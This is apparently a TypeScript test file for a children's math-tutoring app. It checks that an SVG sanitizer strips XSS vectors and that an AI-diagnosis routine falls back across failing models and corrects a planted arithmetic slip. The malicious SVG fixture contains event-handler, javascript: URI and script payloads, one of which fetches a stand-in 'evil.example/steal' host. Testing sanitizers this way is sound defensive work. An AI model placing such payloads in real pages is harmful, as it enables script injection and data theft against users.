import { test } from "node:test";
import assert from "node:assert/strict";
import { diagnoseMistake, sanitizeSvg } from "../src/lib/gemini";

test("sanitizeSvg strips XSS vectors while preserving bar-model geometry and injecting width/height", () => {
  const malicious = `<svg viewBox="0 0 400 120" onload="alert(1)">
    <script>fetch('https://evil.example/steal')</script>
    <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(2)></body></foreignObject>
    <set attributeName="onload" to="alert(3)"/>
    <rect x="10" y="20" width="80" height="30" fill="#E3F2FD" onclick="evil()"/>
    <text x="50" y="40" text-anchor="middle" font-size="14" fill="#333">36本</text>
    <a href="javascript:alert(4)"><text x="100" y="40">bad</text></a>
  </svg>`;

  const clean = sanitizeSvg(malicious);
  assert.ok(clean.startsWith("<svg"), "valid svg preserved");
  assert.ok(!clean.includes("<script"), "script tag stripped");
  assert.ok(!clean.includes("foreignObject"), "foreignObject stripped");
  assert.ok(!/\bon\w+\s*=/i.test(clean), "inline event handlers stripped");
  assert.ok(!clean.includes("<set"), "SMIL <set> stripped");
  assert.ok(!clean.includes("javascript:"), "javascript: URI stripped");
  assert.ok(clean.includes("36本"), "bar-model label preserved");
  assert.ok(/\bwidth=/.test(clean) && /\bheight=/.test(clean), "width and height injected from viewBox for <img> rendering");

  assert.equal(sanitizeSvg("<div>not svg</div>"), "");
});

test("diagnoseMistake falls back across 404/truncated JSON/<3 variants and sanitizes answers + S12 math", async () => {
  const calls: string[] = [];
  const rawValidPayload = JSON.stringify({
    stem_text: "有 $23$ 个苹果，每 $4$ 个装一盘，可以装几盘，还剩几个？",
    student_answer: "4盘……7个",
    correct_answer: "$5$ 盘……$3$ 个",
    grade: 2,
    category: "数与代数/有余数的除法",
    error_category: "CONCEPT_CONFUSION",
    root_cause: "余数 7 大于除数 4",
    knowledge_points: ["有余数的除法"],
    socratic_hints: ["提示1", "提示2", "提示3", "多余提示4"],
    svg_diagram: `<svg viewBox="0 0 400 120"><script>alert(1)</script><rect x="10" y="20" width="60" height="40" fill="#eee"/><text x="40" y="45">?个</text></svg>`,
    variants: [
      {
        level: "L1",
        stem: "有 29 个苹果，每 5 个装一盘，可以装几盘，还剩几个？",
        answer: "5盘……4个",
        explanation: "29÷5=5……4",
      },
      {
        level: "L2",
        stem: "小明收集了 15 张卡片，小红是他的 3 倍，小红比小明多几张？",
        answer: "28张", // deliberate arithmetic slip: 15*3 - 15 = 30
        answer_expr: "15 * 3 - 15",
        explanation: "45-15=30",
      },
      {
        level: "L3",
        stem: "每人分 4 颗糖，分给 5 人还剩 3 颗，共几颗？",
        answer: "$23$ 颗",
        answer_expr: "4 * 5 + 3",
        explanation: "4*5+3=23",
      },
    ],
  });

  let callIdx = 0;
  const fakeCaller = async ({ model }: { model: string }) => {
    calls.push(model);
    callIdx++;
    if (callIdx === 1) throw new Error('{"error":{"code":404,"message":"model not found"}}');
    if (callIdx === 2) return '{"stem_text": "truncated json...'; // SyntaxError -> must continue fallback!
    if (callIdx === 3) {
      // Incomplete variants (<3 levels) -> must reject and fall back!
      return JSON.stringify({
        stem_text: "x",
        student_answer: "1",
        correct_answer: "2",
        grade: 2,
        category: "c",
        error_category: "EXECUTION_ERROR",
        root_cause: "r",
        knowledge_points: [],
        socratic_hints: ["a", "b", "c"],
        variants: [{ level: "L1", stem: "s", answer: "2", explanation: "e" }],
      });
    }
    return rawValidPayload;
  };

  const d = await diagnoseMistake(Buffer.from([0xff, 0xd8, 0xff, 0xd9]), "image/jpeg", "孩子没看懂余数", {
    caller: fakeCaller,
    models: ["m-404", "m-trunc", "m-good"],
    backoffMs: 0,
  });
  assert.ok(calls.length >= 4, `expected fallback across 404, SyntaxError, and <3 variants; calls=${calls.join(",")}`);
  assert.equal(d.variants.length, 3);
  assert.deepEqual(d.variants.map((v) => v.level), ["L1", "L2", "L3"]);
  assert.equal(d.socratic_hints.length, 3);
  assert.ok(!d.variants[2].answer.includes("$"), `expected $ stripped from L3 answer, got ${d.variants[2].answer}`);
  assert.ok(d.variants[1].answer.includes("30"), `expected S12 auto-heal to 30张, got ${d.variants[1].answer}`);
  assert.ok(d.svg_diagram && !d.svg_diagram.includes("<script"), "SVG script stripped during diagnosis sanitize");
});
